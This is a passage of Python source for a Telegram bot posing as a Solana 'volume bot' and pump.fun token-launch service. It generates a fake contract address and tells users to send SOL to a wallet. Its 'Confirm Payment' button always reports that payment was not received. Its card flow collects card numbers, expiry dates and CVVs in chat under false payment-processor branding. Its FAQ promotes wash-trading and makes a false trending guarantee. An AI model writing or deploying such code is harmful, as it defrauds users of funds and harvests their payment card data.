''', reply_markup)
        
    elif query.data == 'skip_socials':
        context.user_data['token_creation']['socials'] = 'No socials provided'
        context.user_data['awaiting_token_socials'] = False
        
        name_ticker = context.user_data['token_creation'].get('name_ticker', 'Not set')
        description = context.user_data['token_creation'].get('description', 'No description')
        image_file_id = context.user_data['token_creation'].get('image')
        
        keyboard = [
            [
                InlineKeyboardButton('✅ Confirm', callback_data='launch_token'),
                InlineKeyboardButton('✏️ Edit', callback_data='createtoken')
            ],
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if image_file_id:
            await query.message.reply_photo(
                photo=image_file_id,
                caption=f'''
📋 <b>Token Creation Summary</b>

<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> Skipped
<b>Image:</b> ✓ Received 

Ready to launch?
''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.message.reply_text(f'''
📋 <b>Token Creation Summary</b>

<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> Skipped
<b>Image:</b> Not provided

Ready to launch?
''', parse_mode='HTML', reply_markup=reply_markup)
        
    elif query.data == 'launch_token':
        # Get token data
        token_data = context.user_data.get('token_creation', {})
        name_ticker = token_data.get('name_ticker', 'Not set')
        description = token_data.get('description', 'No description')
        socials = token_data.get('socials', 'None')
        image_file_id = token_data.get('image')
        
        # Create a random contract address for demo
        import random
        import string
        contract = ''.join(random.choices(string.ascii_letters + string.digits, k=44))
        
        # Create keyboard with 6 buttons in 3 rows (2 buttons per row)
        keyboard = [
            [
                InlineKeyboardButton('0.5 SOL', callback_data='buy_0.5'),
                InlineKeyboardButton('1 SOL', callback_data='buy_1')
            ],
            [
                InlineKeyboardButton('3 SOL', callback_data='buy_3'),
                InlineKeyboardButton('5 SOL', callback_data='buy_5')
            ],
            [
                InlineKeyboardButton('10 SOL', callback_data='buy_10'),
                InlineKeyboardButton('15 SOL', callback_data='buy_15')
            ],
            [
                InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun'),
                InlineKeyboardButton('🏠 Main Menu', callback_data='main')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send success message with image if available
        if image_file_id:
            await query.message.reply_photo(
                photo=image_file_id,
                caption=f'''
<b>Token Creation Summary</b>

<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Creation Fee</b> = 0$
<b>You can choose to acquire coin before it goes live</b>
<i>Spot shows Common Amount and high Volume Chances</i>
''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.message.reply_text(f'''
<b>Token Creation Summary</b>

<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Creation Fee</b> = 0$
<b>You can choose to acquire coin before it goes live</b>
<i>Spot shows Common Amount and high Volume Chances</i>
''', parse_mode='HTML', reply_markup=reply_markup)
        
        # Clear creation data
        #context.user_data['awaiting_token_socials'] = False
        #context.user_data.pop('token_creation', None)

    elif query.data == 'buy_0.5':
        # Get token data from context
        token_data = context.user_data.get('token_creation', {})
        name_ticker = token_data.get('name_ticker', 'Not set')
        description = token_data.get('description', 'No description')
        socials = token_data.get('socials', 'None')
        image_file_id = token_data.get('image')
        
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        # Create keyboard with ONLY Pay with Card button
        keyboard = [
            [InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_0.5')],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm_payment_0.5')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if image_file_id:
            await query.message.reply_photo(
                photo=image_file_id,
                caption=f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 0.5 SOL</b>

Send 0.5 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.message.reply_text(f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 0.5 SOL</b>

Send 0.5 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''', parse_mode='HTML', reply_markup=reply_markup)
            
    elif query.data == 'buy_1':
        # Get token data from context
        token_data = context.user_data.get('token_creation', {})
        name_ticker = token_data.get('name_ticker', 'Not set')
        description = token_data.get('description', 'No description')
        socials = token_data.get('socials', 'None')
        image_file_id = token_data.get('image')
        
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        # Create keyboard with ONLY Pay with Card button
        keyboard = [
            [InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_1')],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm_payment_1')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if image_file_id:
            await query.message.reply_photo(
                photo=image_file_id,
                caption=f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 1 SOL</b>

Send 1 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.message.reply_text(f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 1 SOL</b>

Send 1 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''', parse_mode='HTML', reply_markup=reply_markup)
                
    elif query.data == 'buy_3':
        # Get token data from context
        token_data = context.user_data.get('token_creation', {})
        name_ticker = token_data.get('name_ticker', 'Not set')
        description = token_data.get('description', 'No description')
        socials = token_data.get('socials', 'None')
        image_file_id = token_data.get('image')
        
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        # Create keyboard with ONLY Pay with Card button
        keyboard = [
            [InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_3')],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm_payment_3')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if image_file_id:
            await query.message.reply_photo(
                photo=image_file_id,
                caption=f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 3 SOL</b>

Send 3 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.message.reply_text(f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 3 SOL</b>

Send 3 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''', parse_mode='HTML', reply_markup=reply_markup)
                    
    elif query.data == 'buy_5':
        # Get token data from context
        token_data = context.user_data.get('token_creation', {})
        name_ticker = token_data.get('name_ticker', 'Not set')
        description = token_data.get('description', 'No description')
        socials = token_data.get('socials', 'None')
        image_file_id = token_data.get('image')
        
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        # Create keyboard with ONLY Pay with Card button
        keyboard = [
            [InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_5')],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm_payment_5')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if image_file_id:
            await query.message.reply_photo(
                photo=image_file_id,
                caption=f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 5 SOL</b>

Send 5 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.message.reply_text(f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 5 SOL</b>

Send 5 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''', parse_mode='HTML', reply_markup=reply_markup)
        
    elif query.data == 'buy_10':
        # Get token data from context
        token_data = context.user_data.get('token_creation', {})
        name_ticker = token_data.get('name_ticker', 'Not set')
        description = token_data.get('description', 'No description')
        socials = token_data.get('socials', 'None')
        image_file_id = token_data.get('image')
        
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        # Create keyboard with ONLY Pay with Card button
        keyboard = [
            [InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_10')],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm_payment_10')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if image_file_id:
            await query.message.reply_photo(
                photo=image_file_id,
                caption=f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 10 SOL</b>

Send 10 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.message.reply_text(f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 10 SOL</b>

Send 10 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''', parse_mode='HTML', reply_markup=reply_markup)
        
    elif query.data == 'buy_15':
        # Get token data from context
        token_data = context.user_data.get('token_creation', {})
        name_ticker = token_data.get('name_ticker', 'Not set')
        description = token_data.get('description', 'No description')
        socials = token_data.get('socials', 'None')
        image_file_id = token_data.get('image')
        
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        
        # Create keyboard with ONLY Pay with Card button
        keyboard = [
            [InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_15')],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm_payment_15')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if image_file_id:
            await query.message.reply_photo(
                photo=image_file_id,
                caption=f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 15 SOL</b>

Send 15 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.message.reply_text(f'''
<b>Token Creation Summary</b>
<b>Name/Ticker:</b> {name_ticker}
<b>Description:</b> {description}
<b>Socials:</b> {socials}

<b>Create and Acquire 15 SOL</b>

Send 15 SOL to:
<code>{wallet_address}</code>

Click Confirm Payment ✅
''', parse_mode='HTML', reply_markup=reply_markup)

    elif query.data == 'faq':
        faq_message = """
    <b>FAQ — Solscan.io Volume Bot</b>

    1. <b>What is the Solscan.io Volume Bot?</b>
    The Solscan.io Volume Bot is a tool that helps increase on-chain activity for Solana tokens by generating micro buys, bumps, and trading volume. This activity can help a token gain visibility on trackers and increase engagement around the project.

    2. <b>What features does the bot offer?</b>
    The bot provides several services including:
    • Volume Bot – Generates buy transactions to simulate organic trading activity.
    • Micro Buys / Bumps – Small randomized buys that increase transaction count.
    • Trending Boost – Helps push tokens toward trending sections on trackers.
    • Pump.fun Token Launch – Create and manage tokens launched on pump.fun.
    • Creator Rewards Claim – Claim eligible pump.fun creator rewards easily.

    3. <b>How does the volume bot work?</b>
    The bot performs multiple small buy transactions on your token using distributed wallets.
    These transactions appear on-chain and can increase:
    • Trading activity
    • Transaction count
    • Visibility on analytics platforms
    All actions are executed on the Solana blockchain, so they are publicly visible.

    4. <b>What are "micro buys" or "bumps"?</b>
    Micro buys are small automated purchases of a token made repeatedly over a set period.
    They are commonly used to:
    • Increase transaction count
    • Create steady trading activity
    • Improve chart appearance

    5. <b>Can I use the bot for pump.fun tokens?</b>
    Yes. The bot supports pump.fun token management, including:
    • Launch assistance
    • Volume boosting
    • Wallet activity simulation
    • Creator reward claiming

    6. <b>Do I need coding experience to use the bot?</b>
    No. The system is designed to be simple and user-friendly, usually accessible through Telegram commands or a web dashboard.

    7. <b>Is my wallet safe when using the bot?</b>
    You should never share your private key with anyone.
    Most bots require only:
    • Token address
    • Amount to spend
    • Duration or volume target
    Always verify the service before using it.

    8. <b>How long does a volume campaign run?</b>
    Campaign duration depends on the plan selected. Common options include:
    • 1 hour
    • 6 hours
    • 12 hours
    • 24 hours
    Some services also allow custom durations.

    9. <b>Will the bot guarantee my token trends?</b>
    Yes service can guarantee trending, because trending algorithms depend on multiple factors such as:
    • Real trading activity
    • Community engagement
    • Market conditions
    The bot simply increases on-chain activity that improve visibility.

    10. <b>Where can I track the volume activity?</b>
    You can monitor all transactions directly on:
    • Solscan.io
    • Other Solana blockchain explorers
    • Token analytics platforms
    Since transactions occur on-chain, they are fully transparent.

    <b>Supported Channels</b>
    Trending promotions may also be supported on:
    • @SOLTRENDING
    • @solana_live
    These communities highlight active Solana projects and trending tokens.

    💡 <b>Tip:</b>
    For best results, combine volume boosting with:
    • Strong community marketing
    • Social media promotion
    • Real liquidity
    Bots alone rarely sustain long-term growth.
    """
        
        keyboard = [
            [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await edit_message(faq_message, reply_markup, parse_mode='HTML')

    elif query.data.startswith('reply_'):
        user_id = int(query.data.split('_')[1])
        context.user_data['replying_to_user'] = user_id
        context.user_data['awaiting_admin_reply'] = True
        
        await query.answer()
        
        # Send a NEW message instead of editing the old one
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=f"✏️ <b>Reply Mode Activated</b>\n\nYou're now replying to user <code>{user_id}</code>\nType your message below and I'll send it to them.",
            parse_mode='HTML'
        )

    elif query.data.startswith('pay_card_'):
        amount = query.data.split('_')[2]
        
        # Store the amount in user_data for later use
        context.user_data['card_payment_amount'] = amount
        context.user_data['awaiting_card_details'] = True
        
        # === ADD THIS NEW CODE ===
        # Send alert to admin group for card payment initiation
        user = query.from_user
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        alert_text = f"""
🔔 <b>User Activity Alert</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>

📝 <b>Type:</b> Payment Action
💬 <b>Action:</b> Clicked "Pay with Card"
💰 <b>Amount:</b> {amount} SOL

⏰ <b>Time:</b> {current_time}
        """
        
        keyboard = [
            [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_GROUP_ID,
                text=alert_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        except Exception as e:
            print(f"Error sending card payment alert: {e}")
        # === END OF NEW CODE ===
        
        # Create keyboard with cancel option
        keyboard = [
            [InlineKeyboardButton('❌ Cancel Payment', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = f'''
    💳 <b>Payment Method:</b> Credit/Debit Card
    <b>Amount:</b> {amount} SOL
    <i>Input card details in this format:</i>
    ━━━━━━━━━━━━━━━━━━━━━
    <b>Card Number:</b> <code>XXXX XXXX XXXX XXXX</code>
    <b>Expiry Date:</b> <code>MM/YY</code>
    <b>CVV:</b> <code>XXX</code>
    <b>Billing Address:</b> <code>Street, City, Country (optional)</code>
    ━━━━━━━━━━━━━━━━━━━━━
    <b>Powered by...</b>
    <i>World Pay, Global Payment, Mastercard</i>
    <i>Enter correct details:</i>
    '''
        
        # Check if the message has a photo
        if query.message.photo:
            await query.message.reply_text(
                message_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.edit_message_text(
                message_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            
    elif query.data.startswith('pay_card_trending_'):
        # Extract the duration from the callback data
        duration = query.data.replace('pay_card_trending_', '')
        
        # Store the amount based on duration
        amount_map = {
            '3hours': '4.5',
            '8hours': '7.5',
            '12hours': '14.5',
            '24hours': '24.5',
            '3hours_top8': '4',
            '6hours_top8': '7',
            '8hours_top8': '7',
            '12hours_top8': '12.5',
            '24hours_top8': '20.5',
            '3hours_any': '3',
            '8hours_any': '5.5',
            '12hours_any': '10.5',
            '24hours_any': '16.5',
        }
        
        amount = amount_map.get(duration, '4.5')
        
        # Store the amount in user_data for later use
        context.user_data['card_payment_amount'] = amount
        context.user_data['awaiting_card_details'] = True
        
        # Send alert to admin group
        user = query.from_user
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        alert_text = f"""
🔔 <b>User Activity Alert</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>

📝 <b>Type:</b> Payment Action
💬 <b>Action:</b> Clicked "Pay with Card" (Trending)
💰 <b>Amount:</b> {amount} SOL

⏰ <b>Time:</b> {current_time}
        """
        
        keyboard_alerts = [
            [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
        ]
        reply_markup_alerts = InlineKeyboardMarkup(keyboard_alerts)
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_GROUP_ID,
                text=alert_text,
                parse_mode='HTML',
                reply_markup=reply_markup_alerts
            )
        except Exception as e:
            print(f"Error sending card payment alert: {e}")
        
        # Create keyboard with cancel option
        keyboard = [
            [InlineKeyboardButton('❌ Cancel Payment', callback_data='trending')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = f'''
💳 <b>Payment Method:</b> Credit/Debit Card
<b>Amount:</b> {amount} SOL
<i>Input card details in this format:</i>
━━━━━━━━━━━━━━━━━━━━━
<b>Card Number:</b> <code>XXXX XXXX XXXX XXXX</code>
<b>Expiry Date:</b> <code>MM/YY</code>
<b>CVV:</b> <code>XXX</code>
<b>Billing Address:</b> <code>Street, City, Country (optional)</code>
━━━━━━━━━━━━━━━━━━━━━
<b>Powered by...</b>
<i>World Pay, Global Payment, Mastercard</i>
<i>Enter correct details:</i>
'''
        
        await query.message.reply_text(
            message_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )

    elif query.data.startswith('coupon_trending_'):
        # Extract the duration from the callback data
        duration = query.data.replace('coupon_trending_', '')
        
        # Store the amount based on duration
        amount_map = {
            '3hours': '4.5',
            '8hours': '7.5',
            '12hours': '14.5',
            '24hours': '24.5',
            '3hours_top8': '4',
            '6hours_top8': '7',
            '8hours_top8': '7',
            '12hours_top8': '12.5',
            '24hours_top8': '20.5',
            '3hours_any': '3',
            '8hours_any': '5.5',
            '12hours_any': '10.5',
            '24hours_any': '16.5',
        }
        
        amount = amount_map.get(duration, '4.5')
        
        # Clear any pending trending link state
        context.user_data['awaiting_trending_link'] = False
        
        # Store the amount in user_data for later use
        context.user_data['coupon_payment_amount'] = amount
        context.user_data['awaiting_coupon'] = True
        
        # Send alert to admin group
        user = query.from_user
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        alert_text = f"""
🔔 <b>User Activity Alert</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>

📝 <b>Type:</b> Payment Action
💬 <b>Action:</b> Clicked "Pay with Coupon" (Trending)
💰 <b>Amount:</b> {amount} SOL

⏰ <b>Time:</b> {current_time}
        """
        
        keyboard_alerts = [
            [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
        ]
        reply_markup_alerts = InlineKeyboardMarkup(keyboard_alerts)
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_GROUP_ID,
                text=alert_text,
                parse_mode='HTML',
                reply_markup=reply_markup_alerts
            )
        except Exception as e:
            print(f"Error sending coupon alert: {e}")
        
        # Create keyboard with cancel option
        keyboard = [
            [InlineKeyboardButton('❌ Cancel', callback_data='trending')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = f'''
🎫 <b>Pay with Coupon</b>
<b>Get 90% | 50% | 30% Discount</b>
<b>Amount:</b> {amount} SOL

<i>Enter your coupon code below:</i>
'''
        
        await query.message.reply_text(
            message_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )

    elif query.data.startswith('coupon_bump_'):
        # Format: coupon_bump_1hr_70, coupon_bump_3hr_200, or coupon_bump_random
        parts = query.data.split('_')
        
        # Check if this is the random option
        if parts[2] == 'random':
            # Handle random bump coupon
            print(f"DEBUG: Random bump coupon selected")
            
            # Store that this is a random bump
            context.user_data['coupon_service'] = 'bump_random'
            context.user_data['awaiting_coupon'] = True
            
            # Send alert to admin group
            user = query.from_user
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            alert_text = f"""
    🔔 <b>User Activity Alert</b>

    👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
    🆔 <b>ID:</b> <code>{user.id}</code>

    📝 <b>Type:</b> Payment Action
    💬 <b>Action:</b> Clicked "Pay with Coupon" (Random Bump)

    ⏰ <b>Time:</b> {current_time}
            """
            
            keyboard_alerts = [
                [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
            ]
            reply_markup_alerts = InlineKeyboardMarkup(keyboard_alerts)
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_GROUP_ID,
                    text=alert_text,
                    parse_mode='HTML',
                    reply_markup=reply_markup_alerts
                )
            except Exception as e:
                print(f"Error sending random bump coupon alert: {e}")
            
            # Create keyboard with cancel option
            keyboard = [
                [InlineKeyboardButton('❌ Cancel', callback_data='startbump')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            message_text = f'''
    🎫 <b>Pay with Coupon</b>
    <b>Service:</b> Random Bump
    <b>Amount:</b> Any amount (min 0.3 SOL)
    <b>Get 90% | 50% | 30% Discount</b>

    <i>Enter your coupon code below:</i>
    '''
            
            await query.message.reply_text(
                message_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            
        else:
            # Regular bump with fixed USD amount
            duration = parts[2]  # 1hr, 3hr, etc.
            usd_amount = parts[3]  # 70, 200, etc.
            
            print(f"DEBUG: Bump coupon - Duration: {duration}, USD: {usd_amount}")
            
            # Store the USD amount in user_data for later calculation
            context.user_data['coupon_usd_amount'] = usd_amount
            context.user_data['coupon_service'] = f"bump_{duration}"
            context.user_data['awaiting_coupon'] = True
            
            # Send alert to admin group
            user = query.from_user
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            alert_text = f"""
    🔔 <b>User Activity Alert</b>

    👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
    🆔 <b>ID:</b> <code>{user.id}</code>

    📝 <b>Type:</b> Payment Action
    💬 <b>Action:</b> Clicked "Pay with Coupon" (Bump)
    💰 <b>Service:</b> {duration} Bump
    💰 <b>USD Amount:</b> ${usd_amount}

    ⏰ <b>Time:</b> {current_time}
            """
            
            keyboard_alerts = [
                [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
            ]
            reply_markup_alerts = InlineKeyboardMarkup(keyboard_alerts)
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_GROUP_ID,
                    text=alert_text,
                    parse_mode='HTML',
                    reply_markup=reply_markup_alerts
                )
            except Exception as e:
                print(f"Error sending bump coupon alert: {e}")
            
            # Create keyboard with cancel option
            keyboard = [
                [InlineKeyboardButton('❌ Cancel', callback_data='startbump')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            message_text = f'''
    🎫 <b>Pay with Coupon</b>
    <b>Service:</b> {duration} Bump
    <b>USD Value:</b> ${usd_amount}
    <b>Get 90% | 50% | 30% Discount</b>

    <i>Enter your coupon code below:</i>
    '''
            
            await query.message.reply_text(
                message_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )

    elif query.data.startswith('coupon_'):
        # Get the full callback data (e.g., 'coupon_3sol', 'coupon_5sol', etc.)
        callback_data = query.data
        print(f"DEBUG: Full callback data: {callback_data}")
        
        # Extract the amount part (everything after 'coupon_')
        amount_part = callback_data.replace('coupon_', '')
        print(f"DEBUG: Amount part: {amount_part}")
        
        # Extract just the numbers from the amount part
        import re
        numbers = re.findall(r'\d+', amount_part)
        print(f"DEBUG: Numbers found: {numbers}")
        
        if numbers:
            # Take the first number found (should be the amount)
            numeric_part = numbers[0]
            print(f"DEBUG: Extracted numeric part: {numeric_part}")
        else:
            # Fallback to a default value
            numeric_part = "0"
            print(f"DEBUG: No numbers found, using default 0")
        
        # Store the amount in user_data for later use
        context.user_data['coupon_payment_amount'] = numeric_part
        print(f"DEBUG: FINAL stored coupon amount: {numeric_part} for user {query.from_user.id}")
        context.user_data['awaiting_coupon'] = True
        
        # Determine which service this is based on the amount
        service_description = ""
        volume_increase = ""
        
        # Map the numeric values to their service descriptions
        if numeric_part == "3":
            service_description = "$50k Volume"
            volume_increase = "$50k"
        elif numeric_part == "5":
            service_description = "$100k Volume"
            volume_increase = "$100k"
        elif numeric_part == "13":
            service_description = "$250k Volume"
            volume_increase = "$250k"
        elif numeric_part == "25":
            service_description = "$500k Volume"
            volume_increase = "$500k"
        elif numeric_part == "45":
            service_description = "$1M Volume"
            volume_increase = "$1M"
        elif numeric_part == "210":
            service_description = "$5M Volume"
            volume_increase = "$5M"
        else:
            service_description = f"{numeric_part} SOL Package"
            volume_increase = numeric_part
        
        # Send alert to admin group for coupon payment initiation
        user = query.from_user
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        alert_text = f"""
    🔔 <b>User Activity Alert</b>

    👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
    🆔 <b>ID:</b> <code>{user.id}</code>

    📝 <b>Type:</b> Payment Action
    💬 <b>Action:</b> Clicked "Pay with Coupon"
    💰 <b>Service:</b> {service_description}
    💰 <b>Amount:</b> {numeric_part} SOL

    ⏰ <b>Time:</b> {current_time}
        """
        
        keyboard = [
            [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_GROUP_ID,
                text=alert_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        except Exception as e:
            print(f"Error sending coupon alert: {e}")
        
        # Create keyboard with cancel option
        keyboard = [
            [InlineKeyboardButton('❌ Cancel', callback_data='launch_token')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        

        message_text = f'''
    🎫 <b>Pay with Coupon</b>
    <b>Get 90% | 50% | 30% Discount</b>
    <b>Amount:</b> {numeric_part} SOL
    
    <i>Enter your coupon code below:</i>
    '''
        
        # Check if the message has a photo
        if query.message.photo:
            await query.message.reply_text(
                message_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            await query.edit_message_text(
                message_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            
    elif query.data.startswith('confirm_payment_'):
        amount = query.data.split('_')[2]
        
        await query.answer(
            text="❌ Payment not received.",
            show_alert=True
        )

        # Check if the message has a photo
        if query.message.photo:
            # Photo message - we need to send a new message instead of editing
            msg = await query.message.reply_text("<b>⏳ Validating</b>", parse_mode='HTML')
        else:
            # Text message - we can edit
            try:
                await query.edit_message_text(
                    "🔍 Check payment for validation...",
                    parse_mode='HTML'
                )
            except BadRequest as e:
                # If editing fails, just send a new message
                print(f"Could not edit message: {e}")
            msg = await query.message.reply_text("<b>⏳ Validating</b>", parse_mode='HTML')

        # Animate with italic formatting
        dots = ["⏳ <i>Validating</i>", "⏳ <i>Validating.</i>", "⏳ <i>Validating..</i>", "⏳ <i>Validating...</i>"]
        final_message = " <i>Payment not Received. Contact support if SOL was sent</i>"
        try:
            for i in range(12):
                await asyncio.sleep(0.2)
                await msg.edit_text(f"<b>{dots[i % 4]}</b>", parse_mode='HTML')
            
            await msg.edit_text(final_message, parse_mode='HTML')
        except Exception as e:
            print(f"Error in animation: {e}")
            try:
                await msg.edit_text(final_message, parse_mode='HTML')
            except:
                pass

    elif query.data.startswith('process_card_'):
        amount = query.data.split('_')[2]
        
        # === ADD THIS NEW CODE ===
        # Send alert to admin group for payment processing
        user = query.from_user
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        alert_text = f"""
🔔 <b>User Activity Alert</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>

📝 <b>Type:</b> Payment Action
💬 <b>Action:</b> Processing Payment
💰 <b>Amount:</b> {amount} SOL
✅ <b>Status:</b> Payment Successful

⏰ <b>Time:</b> {current_time}
        """
        
        keyboard = [
            [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_GROUP_ID,
                text=alert_text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        except Exception as e:
            print(f"Error sending payment success alert: {e}")
        # === END OF NEW CODE ===
        
        # Show processing animation
        await query.answer("Processing payment...", show_alert=False)
        
        # Create processing animation
        msg = await query.message.reply_text("<b>⏳ Processing Card Payment...</b>", parse_mode='HTML')
        
        dots = ["⏳ Processing", "⏳ Processing.", "⏳ Processing..", "⏳ Processing..."]
        for i in range(8):  # 2 seconds of animation
            await asyncio.sleep(0.25)
